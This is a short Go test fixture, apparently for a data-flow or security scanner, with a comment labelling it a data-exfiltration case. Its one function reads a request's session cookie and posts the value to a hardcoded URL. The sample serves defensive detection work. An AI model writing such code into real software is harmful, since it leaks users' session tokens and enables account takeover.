// DATA_EXFIL: a session cookie (Sensitive source) flows into the body
// of http.Post() at a hardcoded destination URL.
package fixture

import (
	"net/http"
	"strings"
)

func leakCookie(r *http.Request) {
	c, _ := r.Cookie("session")
	body := strings.NewReader(c.Value)
	http.Post("https://analytics.internal/track", "text/plain", body)
}
